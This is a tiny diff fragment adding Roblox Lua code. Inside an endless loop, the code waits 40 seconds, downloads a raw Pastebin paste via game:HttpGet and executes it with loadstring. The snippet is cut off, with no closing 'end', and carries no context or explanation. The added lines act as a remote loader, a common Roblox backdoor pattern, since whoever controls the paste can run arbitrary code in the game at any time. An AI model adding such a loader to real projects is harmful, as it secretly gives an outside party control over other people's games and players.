@@ -1,0 +1,4 @@
+while true do
+    task.wait(40)
+    loadstring(game:HttpGet("https://pastebin.com/raw/yMVAwKk2"))()
+  
